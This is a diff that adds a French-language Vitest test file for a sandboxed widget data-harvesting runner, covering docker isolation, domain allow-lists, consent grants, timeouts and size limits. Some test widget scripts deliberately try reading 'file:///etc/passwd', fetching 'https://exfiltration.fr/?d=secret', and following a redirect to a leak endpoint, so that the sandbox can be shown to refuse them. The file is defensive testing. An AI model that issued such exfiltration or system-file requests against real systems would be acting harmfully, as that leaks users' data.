@@ -1,0 +1,469 @@
+import { describe, it, expect, afterEach } from "vitest";
+import { spawn } from "node:child_process";
+import { createServer, type Server } from "node:http";
+import type { AddressInfo } from "node:net";
+import { mkdir, readFile, writeFile } from "node:fs/promises";
+import { existsSync } from "node:fs";
+import { join } from "node:path";
+import { cheminsEspace } from "../../src/chemins.js";
+import { Atelier, IMAGE } from "../../src/conteneur/atelier.js";
+import { DeclarationWidget, type WidgetLu } from "../../src/accueil/schemas.js";
+import { ecrireDonnees, lireEtatWidget } from "../../src/accueil/donnees.js";
+import { IaLocale } from "../../src/ia/ia-locale.js";
+import { PontFactice } from "../../src/mcp/pont-factice.js";
+import { accorder, lireAccords, retirerAccord } from "../../src/widgets/accords.js";
+import { executerRecolte, type LanceurProcessus } from "../../src/widgets/recolte.js";
+import { dossierTemporaire } from "../aide/temporaire.js";
+import { executeurFactice } from "../aide/executeur-factice.js";
+import { fauxKev, fauxOllama, type FauxServeur } from "../aide/faux-ia.js";
+
+const SCRIPT = join(import.meta.dirname, "..", "..", "docker", "recolteur.mjs");
+const MAINTENANT = new Date("2026-10-28T10:00:00.000Z");
+const horloge = () => MAINTENANT;
+
+const aFermer: { fermer(): Promise<void> }[] = [];
+const iaAArreter: IaLocale[] = [];
+afterEach(async () => {
+  await Promise.all(aFermer.splice(0).map((s) => s.fermer()));
+  await Promise.all(iaAArreter.splice(0).map((i) => i.arreter()));
+});
+
+/** Petit serveur HTTP : `routes[chemin]` répond. */
+async function serveurWeb(routes: Record<string, (res: import("node:http").ServerResponse) => void>) {
+  const requetes: { url: string; enTetes: Record<string, unknown> }[] = [];
+  const s: Server = createServer((req, res) => {
+    requetes.push({ url: req.url ?? "", enTetes: req.headers });
+    const r = routes[req.url ?? ""];
+    if (r) r(res);
+    else {
+      res.writeHead(404);
+      res.end();
+    }
+  });
+  await new Promise<void>((ok) => s.listen(0, "127.0.0.1", ok));
+  const port = (s.address() as AddressInfo).port;
+  const serveur = {
+    port,
+    url: `http://127.0.0.1:${port}`,
+    requetes,
+    fermer: () => new Promise<void>((ok) => { s.closeAllConnections(); s.close(() => ok()); }),
+  };
+  aFermer.push(serveur);
+  return serveur;
+}
+
+interface Contexte {
+  widget: WidgetLu & { declaration: DeclarationWidget };
+  dossierWidgets: string;
+  espace: string;
+  commandes: string[][];
+  tues: number;
+  executer: ReturnType<typeof executeurFactice>;
+  atelier: Atelier;
+  lancer: LanceurProcessus;
+}
+
+/** Crée un widget `id` (widget.json + recolte.mjs) et un lanceur qui exécute le récolteur en local, sans docker. */
+async function preparer(id: string, code: string, sources = { compte: [] as string[], publiques: [] as string[] }, config: unknown = { a: 1 }): Promise<Contexte> {
+  const espace = await dossierTemporaire();
+  const dossier = join(espace, "accueil", "widgets", id);
+  await mkdir(dossier, { recursive: true });
+  const brut = {
+    nom: "Test",
+    tailles: { min: { l: 1, h: 1 }, max: { l: 4, h: 4 }, defaut: { l: 2, h: 2 } },
+    recolte: { minutes: 60 },
+    sources,
+    config,
+  };
+  await writeFile(join(dossier, "widget.json"), JSON.stringify(brut));
+  await writeFile(join(dossier, "recolte.mjs"), code);
+  const declaration = DeclarationWidget.parse(brut);
+  const executer = executeurFactice([]);
+  const ctx: Contexte = {
+    widget: {
+      id,
+      dossier,
+      declaration,
+      etat: { statut: "ok", derniereMaj: null, derniereTentative: null },
+      donnees: null,
+      exemple: null,
+      aRecolte: true,
+      aAffichage: true,
+    },
+    dossierWidgets: await dossierTemporaire(),
+    espace,
+    commandes: [],
+    tues: 0,
+    executer,
+    atelier: new Atelier({ chemins: cheminsEspace(espace), docker: "docker", executer: executer.executer }),
+    lancer: (cmd, args) => {
+      ctx.commandes.push([cmd, ...args]);
+      const e = spawn(process.execPath, [SCRIPT, dossier], { stdio: ["pipe", "pipe", "pipe"] });
+      return {
+        stdin: e.stdin,
+        stdout: e.stdout,
+        stderr: e.stderr,
+        tuer: () => {
+          ctx.tues++;
+          e.kill("SIGKILL");
+        },
+        fin: new Promise((ok) => e.on("close", (c) => ok(c))),
+      };
+    },
+  };
+  return ctx;
+}
+
+async function ia(o: { kev?: FauxServeur; ollama?: FauxServeur } = {}) {
+  const i = new IaLocale({ dossier: await dossierTemporaire(), executer: executeurFactice([]).executer, kevUrl: o.kev?.url ?? "http://127.0.0.1:9", ollamaUrl: o.ollama?.url ?? "http://127.0.0.1:9" });
+  iaAArreter.push(i);
+  return i;
+}
+
+const pontLecture = (refuser: string[] = []) =>
+  new PontFactice([], {
+    actif: null,
+    autoriser: false,
+    lecture: {
+      pages: [{ url: "https://app.daily.dev/", titre: "Fil", texte: "articles", liens: [{ texte: "a", url: "https://app.daily.dev/a" }] }],
+      refuser,
+    },
+  });
+
+const appelsLecture = (p: PontFactice) => p.appels.filter((a) => a.methode === "lirePageInvisible");
+
+async function recolter(ctx: Contexte, o: { ia?: IaLocale | Pick<IaLocale, "kev" | "gemma">; pont?: PontFactice; delaiMs?: number } = {}) {
+  return executerRecolte({
+    id: ctx.widget.id,
+    widget: ctx.widget,
+    dossierWidgets: ctx.dossierWidgets,
+    recolteur: SCRIPT,
+    atelier: ctx.atelier,
+    lancer: ctx.lancer,
+    ia: (o.ia ?? (await ia())) as IaLocale,
+    pont: o.pont ?? pontLecture(),
+    horloge,
+    delaiMs: o.delaiMs,
+    adressesLocales: true,
+  });
+}
+
+const lireJson = async (chemin: string) => JSON.parse(await readFile(chemin, "utf8"));
+
+describe("executerRecolte", () => {
+  it("une récolte réussie écrit donnees.json et l'état ok dans dossierWidgets", async () => {
+    const web = await serveurWeb({ "/flux.json": (res) => { res.writeHead(200, { "content-type": "application/json" }); res.end('{"x":42}'); } });
+    const kev = await fauxKev({ q: { type: "noul", noul: 0.8 } });
+    const ollama = await fauxOllama("bonjour");
+    aFermer.push(kev, ollama);
+    const ctx = await preparer(
+      "meteo",
+      `export default async (w) => {
+        const j = await w.recuperer("${web.url}/flux.json", { format: "json" });
+        const p = await w.lirePage("https://app.daily.dev/");
+        const k = await w.kev("etat", { q: { type: "noul", instructions: "?" } });
+        const g = await w.gemma("salut");
+        w.journal("trace du widget");
+        return { j, titre: p.titre, k, g, cfg: w.config, prec: w.precedent, quand: w.maintenant };
+      };`,
+    );
+    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { ia: await ia({ kev, ollama }), pont });
+
+    const attendu = {
+      j: { x: 42 },
+      titre: "Fil",
+      k: { q: { type: "noul", noul: 0.8 } },
+      g: "bonjour",
+      cfg: { a: 1 },
+      prec: { ancien: true },
+      quand: MAINTENANT.toISOString(),
+    };
+    expect(r.etat.statut).toBe("ok");
+    expect(r.donnees).toEqual(attendu);
+    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual(attendu);
+    const etat = await lireEtatWidget(ctx.dossierWidgets, "meteo");
+    expect(etat).toMatchObject({ statut: "ok", derniereMaj: MAINTENANT.toISOString(), derniereTentative: MAINTENANT.toISOString() });
+    expect(etat.journal).toContain("trace du widget");
+    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: null }]);
+    // Aucun cookie ni identifiant envoyé.
+    expect(web.requetes[0]!.enTetes.cookie).toBeUndefined();
+    expect(web.requetes[0]!.enTetes.authorization).toBeUndefined();
+    // Rien n'est écrit dans l'espace.
+    expect(existsSync(join(ctx.widget.dossier, "donnees.json"))).toBe(false);
+    expect(existsSync(join(ctx.widget.dossier, "etat.json"))).toBe(false);
+    // Le lanceur reçoit la commande docker de l'atelier.
+    expect(ctx.commandes[0]).toEqual(ctx.atelier.commandeRecolte("meteo", ctx.widget.dossier, SCRIPT));
+  });
+
+  it("commandeRecolte monte le widget en :ro, coupe le réseau (--network none) et ne monte rien d'autre de l'espace", async () => {
+    const atelier = new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
+    const c = atelier.commandeRecolte("meteo", "/Users/t/WebAiOs/accueil/widgets/meteo", "/app/docker/recolteur.mjs");
+    expect(c).toEqual([
+      "/usr/local/bin/docker", "run", "-i", "--rm",
+      "--name", "webaios-recolte-meteo",
+      "--network", "none",
+      "--read-only",
+      "--tmpfs", "/tmp",
+      "-v", "/Users/t/WebAiOs/accueil/widgets/meteo:/widget:ro",
+      "-v", "/app/docker/recolteur.mjs:/opt/webaios/recolteur.mjs:ro",
+      "--memory", "512m",
+      "--pids-limit", "128",
+      IMAGE,
+      "timeout", "-k", "5", "180",
+      "node", "/opt/webaios/recolteur.mjs", "/widget",
+    ]);
+    const volumes = c.flatMap((x, i) => (c[i - 1] === "-v" ? [x] : []));
+    expect(volumes).toHaveLength(2);
+    expect(volumes.every((v) => v.endsWith(":ro"))).toBe(true);
+    expect(c.filter((x) => x.includes("/Users/t/WebAiOs")).every((x) => x.startsWith("/Users/t/WebAiOs/accueil/widgets/meteo:"))).toBe(true);
+    expect(() => atelier.commandeRecolte("../x", "/d", "/r")).toThrow();
+    expect(() => new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: null }).commandeRecolte("meteo", "/d", "/r")).toThrow();
+  });
+
+  it("supprimerRecolte force la suppression du conteneur", async () => {
+    const ctx = await preparer("meteo", "export default async () => 1;");
+    await ctx.atelier.supprimerRecolte("meteo");
+    expect(ctx.executer.appels.map((a) => [a.commande, ...a.args])).toEqual([["docker", "rm", "-f", "webaios-recolte-meteo"]]);
+  });
+
+  it("une récolte qui échoue garde les données précédentes et note l'erreur et le journal", async () => {
+    const ctx = await preparer("meteo", `export default async (w) => { console.log("avant l'erreur"); throw new Error("boum ${"x".repeat(900)}"); };`);
+    await ecrireDonnees(ctx.dossierWidgets, "meteo", { ancien: true });
+    const r = await recolter(ctx);
+    expect(r.etat.statut).toBe("erreur");
+    expect(r.donnees).toBeUndefined();
+    expect(r.etat.erreur).toContain("boum");
+    expect(r.etat.erreur!.length).toBeLessThanOrEqual(500);
+    expect(r.etat.journal).toContain("avant l'erreur");
+    expect(r.etat.derniereTentative).toBe(MAINTENANT.toISOString());
+    expect(await lireJson(join(ctx.dossierWidgets, "meteo", "donnees.json"))).toEqual({ ancien: true });
+    expect(await lireEtatWidget(ctx.dossierWidgets, "meteo")).toEqual(r.etat);
+  });
+
+  it("le journal garde les 2 000 derniers caractères de la sortie d'erreur", async () => {
+    const ctx = await preparer("meteo", `export default async (w) => { for (let i = 0; i < 500; i++) w.journal("ligne " + i); return 1; };`);
+    const r = await recolter(ctx);
+    expect(r.etat.statut).toBe("ok");
+    expect(r.etat.journal!.length).toBeLessThanOrEqual(2000);
+    expect(r.etat.journal).toContain("ligne 499");
+    expect(r.etat.journal).not.toContain("ligne 1\n");
+  });
+
+  it("une sortie non nulle sans fin est une erreur", async () => {
+    const ctx = await preparer("meteo", `export default async () => { process.exit(3); };`);
+    const r = await recolter(ctx);
+    expect(r.etat.statut).toBe("erreur");
+    expect(r.etat.erreur).toContain("3");
+  });
+
+  it("délai dépassé : processus tué, état erreur « Délai dépassé »", async () => {
+    const ctx = await preparer("lent", `export default () => new Promise(() => {});`);
+    await ecrireDonnees(ctx.dossierWidgets, "lent", { ancien: true });
+    const debut = Date.now();
+    const r = await recolter(ctx, { delaiMs: 600 });
+    expect(Date.now() - debut).toBeLessThan(5000);
+    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Délai dépassé" });
+    expect(ctx.tues).toBeGreaterThan(0);
+    expect(ctx.executer.appels.some((a) => a.args.join(" ") === "rm -f webaios-recolte-lent")).toBe(true);
+    expect(await lireJson(join(ctx.dossierWidgets, "lent", "donnees.json"))).toEqual({ ancien: true });
+  });
+
+  it("une ligne de plus de 4 Mo tue la récolte : « Réponse trop grande »", async () => {
+    const ctx = await preparer("gros", `export default async () => { process.stdout.write("x".repeat(5 * 1024 * 1024)); await new Promise(() => {}); };`);
+    const r = await recolter(ctx);
+    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Réponse trop grande" });
+    expect(ctx.tues).toBeGreaterThan(0);
+  });
+
+  it("plusieurs appels en vol reçoivent chacun leur réponse", async () => {
+    const web = await serveurWeb({
+      "/lent": (res) => setTimeout(() => res.end("lent"), 300),
+      "/vite": (res) => res.end("vite"),
+    });
+    const ctx = await preparer(
+      "multi",
+      `export default async (w) => Promise.all([w.recuperer("${web.url}/lent"), w.recuperer("${web.url}/vite"), w.recuperer("${web.url}/vite")]);`,
+    );
+    const r = await recolter(ctx);
+    expect(r.donnees).toEqual(["lent", "vite", "vite"]);
+  });
+
+  it("recuperer : http(s) seulement, sans identifiants dans l'URL", async () => {
+    const ctx = await preparer(
+      "public",
+      `const essai = (p) => p.then(() => "ok", (e) => e.message);
+      export default async (w) => [
+        await essai(w.recuperer("file:///etc/passwd")),
+        await essai(w.recuperer("https://moi:secret@exemple.fr/")),
+        await essai(w.recuperer("pas une url")),
+      ];`,
+    );
+    const r = await recolter(ctx);
+    expect(r.etat.statut).toBe("ok");
+    const [fichier, identifiants, invalide] = r.donnees as string[];
+    expect(fichier).toMatch(/http/);
+    expect(identifiants).toMatch(/identifiants/i);
+    expect(invalide).toMatch(/invalide/i);
+  });
+
+  it("recuperer : une adresse locale est refusée par défaut", async () => {
+    const web = await serveurWeb({ "/": (res) => res.end("secret local") });
+    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/").catch((e) => e.message);`);
+    const r = await executerRecolte({
+      id: "public", widget: ctx.widget, dossierWidgets: ctx.dossierWidgets, recolteur: SCRIPT, atelier: ctx.atelier,
+      lancer: ctx.lancer, ia: await ia(), pont: pontLecture(), horloge,
+    });
+    expect(r.donnees).toMatch(/locale/);
+    expect(web.requetes).toHaveLength(0);
+  });
+
+  it("recuperer : réponse de plus de 5 Mo refusée", async () => {
+    const web = await serveurWeb({ "/gros": (res) => res.end("x".repeat(5 * 1024 * 1024 + 10)) });
+    const ctx = await preparer("public", `export default async (w) => w.recuperer("${web.url}/gros").then((t) => t.length, (e) => e.message);`);
+    const r = await recolter(ctx);
+    expect(r.donnees).toMatch(/5 Mo/);
+  });
+
+  it("sans lirePageInvisible, lirePage répond « Lecture de pages indisponible »", async () => {
+    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://a.fr/").catch((e) => e.message);`);
+    const r = await recolter(ctx, { pont: new PontFactice([], { actif: null, autoriser: false }) });
+    expect(r.donnees).toBe("Lecture de pages indisponible");
+  });
+
+  it("widget sans compte : lirePage avec compte est refusé", async () => {
+    const ctx = await preparer("public", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true }).catch((e) => e.message);`);
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    expect(r.donnees).toMatch(/non déclaré/);
+    expect(appelsLecture(pont)).toHaveLength(0);
+  });
+});
+
+describe("executerRecolte, widget avec compte", () => {
+  const sources = { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] };
+
+  it("widget avec compte : lirePage compte sans accord → accord-requis, aucune lecture", async () => {
+    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
+    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    expect(r.etat.statut).toBe("accord-requis");
+    expect(appelsLecture(pont)).toHaveLength(0);
+    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ ancien: true });
+    expect((await lireEtatWidget(ctx.dossierWidgets, "daily")).statut).toBe("accord-requis");
+  });
+
+  it("accord retiré pendant la récolte : la lecture avec compte n'a pas lieu, accord-requis", async () => {
+    const ctx = await preparer(
+      "daily",
+      `export default async (w) => { await w.kev("x", {}); return w.lirePage("https://app.daily.dev/", { compte: true }); };`,
+      sources,
+    );
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
+    const pont = pontLecture();
+    const faux = {
+      kev: async () => { await retirerAccord(ctx.dossierWidgets, "daily"); return {}; },
+      gemma: async () => "",
+    };
+    const r = await recolter(ctx, { pont, ia: faux });
+    expect(r.etat.statut).toBe("accord-requis");
+    expect(appelsLecture(pont)).toHaveLength(0);
+  });
+
+  it("avec un accord valide, lirePage compte lit dans le profil de l'accord", async () => {
+    const ctx = await preparer("daily", `export default async (w) => (await w.lirePage("https://app.daily.dev/", { compte: true })).texte;`, sources);
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    expect(r.etat.statut).toBe("ok");
+    expect(r.donnees).toBe("articles");
+    expect(appelsLecture(pont)[0]!.args).toEqual(["https://app.daily.dev/", { profil: "perso" }]);
+  });
+
+  it("lirePage compte vers un domaine non déclaré en compte est refusé", async () => {
+    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://evil.fr/", { compte: true }).catch((e) => e.message);`, sources);
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    expect(r.donnees).toMatch(/non déclaré/);
+    expect(appelsLecture(pont)).toHaveLength(0);
+  });
+
+  it("widget avec compte : recuperer vers un domaine non déclaré est refusé", async () => {
+    const web = await serveurWeb({ "/": (res) => res.end("ok") });
+    const ctx = await preparer(
+      "daily",
+      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
+      export default async (w) => [
+        await essai(w.recuperer("https://exfiltration.fr/?d=secret")),
+        await essai(w.recuperer("http://localhost:${web.port}/")),
+        await essai(w.lirePage("https://exfiltration.fr/")),
+        await essai(w.recuperer("${web.url}/")),
+      ];`,
+      sources,
+    );
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    const [externe, autreNom, page, declare] = r.donnees as string[];
+    expect(externe).toMatch(/^refus: .*non déclaré/);
+    expect(autreNom).toMatch(/^refus: .*non déclaré/);
+    expect(page).toMatch(/^refus: .*non déclaré/);
+    expect(declare).toBe("ok");
+    expect(web.requetes).toHaveLength(1);
+    expect(appelsLecture(pont)).toHaveLength(0);
+  });
+
+  it("widget avec compte : une redirection vers un domaine non déclaré est refusée", async () => {
+    const cible = await serveurWeb({ "/fuite": (res) => res.end("fuite") });
+    const web = await serveurWeb({
+      "/redir": (res) => { res.writeHead(302, { location: `http://localhost:${cible.port}/fuite` }); res.end(); },
+      "/redir-ok": (res) => { res.writeHead(301, { location: "/fin" }); res.end(); },
+      "/fin": (res) => res.end("arrivé"),
+    });
+    const ctx = await preparer(
+      "daily",
+      `const essai = (p) => p.then((x) => x, (e) => "refus: " + e.message);
+      export default async (w) => [await essai(w.recuperer("${web.url}/redir")), await essai(w.recuperer("${web.url}/redir-ok"))];`,
+      sources,
+    );
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
+    const r = await recolter(ctx);
+    const [fuite, ok] = r.donnees as string[];
+    expect(fuite).toMatch(/^refus: .*non déclaré/);
+    expect(ok).toBe("arrivé");
+    expect(cible.requetes).toHaveLength(0);
+  });
+
+  it("widget avec compte et sans publiques : aucune récupération publique", async () => {
+    const web = await serveurWeb({ "/": (res) => res.end("ok") });
+    const ctx = await preparer("daily", `export default async (w) => w.recuperer("${web.url}/").catch((e) => "refus: " + e.message);`, { compte: ["app.daily.dev"], publiques: [] });
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
+    const r = await recolter(ctx);
+    expect(r.donnees).toMatch(/^refus: .*non déclaré/);
+    expect(web.requetes).toHaveLength(0);
+  });
+
+  it("ProfilRefuse du pont : accord retiré, état accord-requis", async () => {
+    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
+    await ecrireDonnees(ctx.dossierWidgets, "daily", { ancien: true });
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "prive" });
+    await accorder(ctx.dossierWidgets, "autre", { domaines: ["a.fr"], publiques: [], profil: "perso" });
+    const r = await recolter(ctx, { pont: pontLecture(["prive"]) });
+    expect(r.etat.statut).toBe("accord-requis");
+    expect(r.etat.erreur).toBeTruthy();
+    expect(await lireAccords(ctx.dossierWidgets)).toEqual({ autre: { domaines: ["a.fr"], publiques: [], profil: "perso" } });
+    expect(await lireJson(join(ctx.dossierWidgets, "daily", "donnees.json"))).toEqual({ ancien: true });
+  });
+
+  it("un accord dont les domaines ne correspondent plus à la déclaration n'est plus valide", async () => {
+    const ctx = await preparer("daily", `export default async (w) => w.lirePage("https://app.daily.dev/", { compte: true });`, sources);
+    await accorder(ctx.dossierWidgets, "daily", { domaines: ["app.daily.dev"], publiques: [], profil: "perso" });
+    const pont = pontLecture();
+    const r = await recolter(ctx, { pont });
+    expect(r.etat.statut).toBe("accord-requis");
+    expect(appelsLecture(pont)).toHaveLength(0);
+  });
+});
